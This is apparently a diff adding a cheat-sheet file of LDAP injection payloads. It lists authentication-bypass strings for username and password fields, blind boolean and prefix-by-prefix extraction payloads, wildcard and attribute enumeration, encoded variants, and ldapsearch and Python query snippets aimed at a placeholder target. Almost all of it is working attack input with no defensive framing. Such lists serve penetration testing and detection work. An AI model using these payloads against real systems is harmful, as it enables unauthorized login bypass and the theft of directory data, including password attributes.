@@ -1,0 +1,217 @@
+# LDAP Injection Payloads
+
+## ========================================
+## BASIC LDAP INJECTION
+## ========================================
+
+# Authentication Bypass
+*
+*)(&
+*))%00
+admin)(&
+admin)(!(&
+*)(uid=*))(|(uid=*
+*)(|(objectclass=*)
+
+# OR operator
+admin)(|(password=*))
+*)(uid=*))(&(uid=*
+
+## ========================================
+## BLIND LDAP INJECTION
+## ========================================
+
+# Boolean-based
+admin)(&(password=*))
+admin)(&(password=a*))
+admin)(&(password=ab*))
+
+# Extract information
+*)(cn=a*)
+*)(cn=ad*)
+*)(cn=adm*)
+*)(cn=admi*)
+*)(cn=admin*)
+
+## ========================================
+## LDAP FILTERS
+## ========================================
+
+# Basic Filter Syntax
+(cn=admin)
+(uid=admin)
+(mail=admin@example.com)
+
+# AND operator
+(&(cn=admin)(password=pass))
+
+# OR operator
+(|(cn=admin)(cn=user))
+
+# NOT operator
+(!(cn=admin))
+
+## ========================================
+## AUTHENTICATION BYPASS PAYLOADS
+## ========================================
+
+# Username field
+*
+*)(&
+*))%00
+admin)(&
+admin)(!(&
+admin)(|(password=*
+
+# Password field
+*
+password)(&(uid=*))
+*)(uid=*))(|(uid=*
+
+## ========================================
+## WILDCARD ATTACKS
+## ========================================
+
+*
+a*
+ad*
+adm*
+admi*
+admin*
+
+## ========================================
+## ATTRIBUTE ENUMERATION
+## ========================================
+
+# Common attributes
+cn=*
+uid=*
+mail=*
+sn=*
+givenName=*
+memberOf=*
+userPassword=*
+
+## ========================================
+## FILTER INJECTION
+## ========================================
+
+# In search filters
+(cn=admin)(password=*)
+(|(cn=admin)(cn=user))
+(&(cn=admin)(password=*))
+
+# URL encoded
+%2A
+%28%2A%29
+%29%28%26
+%29%29%00
+
+## ========================================
+## PROXY INJECTION
+## ========================================
+
+# Through LDAP proxy
+(cn=admin)(proxyPassword=*)
+(|(cn=admin)(cn=*))
+
+## ========================================
+## ADVANCED TECHNIQUES
+## ========================================
+
+# Nested filters
+(&(cn=admin)(|(password=*)(password=pass)))
+
+# Multiple conditions
+(&(cn=admin)(!(password=wrongpass)))
+
+# Complex OR
+(|(cn=admin)(mail=admin@*)(uid=admin))
+
+## ========================================
+## INFORMATION DISCLOSURE
+## ========================================
+
+# Enumerate valid usernames
+(cn=admin)     # Valid
+(cn=test)      # Invalid
+(cn=root)      # Valid
+
+# Extract attributes
+(cn=admin)(description=*)
+(cn=admin)(info=*)
+
+## ========================================
+## SPECIAL CHARACTERS
+## ========================================
+
+# LDAP special chars
+*
+(
+)
+\
+/
+NUL (%00)
+
+# Escaped characters
+\2a = *
+\28 = (
+\29 = )
+\5c = \
+\00 = NUL
+
+## ========================================
+## FILTER BYPASS
+## ========================================
+
+# Case sensitivity
+Admin
+ADMIN
+aDmIn
+
+# Spaces
+( cn = admin )
+(  cn  =  admin  )
+
+## ========================================
+## COMMON PAYLOADS
+## ========================================
+
+# Login bypass
+username: *
+password: *
+
+username: admin)(&
+password: anything
+
+username: admin)(|(password=*
+password: anything
+
+username: *)(uid=*))(|(uid=*
+password: anything
+
+## ========================================
+## TOOLS
+## ========================================
+
+# ldapsearch
+ldapsearch -x -H ldap://target.com -b "dc=example,dc=com" "(cn=*)"
+
+# Python
+import ldap
+conn = ldap.initialize('ldap://target.com')
+result = conn.search_s('dc=example,dc=com', ldap.SCOPE_SUBTREE, '(cn=*)')
+
+## ========================================
+## COMMON ATTRIBUTES
+## ========================================
+
+cn - Common Name
+sn - Surname
+uid - User ID
+mail - Email
+memberOf - Group membership
+userPassword - Password
+description - Description
+telephoneNumber - Phone
+objectClass - Object type
